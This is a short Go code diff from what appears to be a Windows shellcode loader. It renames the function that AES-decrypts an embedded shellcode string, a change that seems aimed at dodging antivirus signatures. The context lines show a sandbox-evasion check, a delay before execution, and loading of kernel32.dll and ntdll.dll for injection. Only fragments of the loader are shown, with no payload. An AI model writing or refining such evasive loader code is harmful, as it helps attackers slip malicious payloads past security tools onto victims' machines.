@@ -19,7 +19,7 @@ func main() {
 	sandbox.See_through()
 	time.Sleep(10 * time.Second)
 
-	shellcode :=safsafSD(sc)
+	shellcode :=Sssssf(sc)
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
@@ -43,7 +43,7 @@ func main() {
 
 }
 
-func safsafSD(src string)[]byte{
+func Sssssf(src string)[]byte{
 	i,_ := strconv.Atoi(Kmode)
 	skey, _ := hex.DecodeString(aeskey)
 	aes:= encrypt.NewAES() // 默认是Cbc 模式
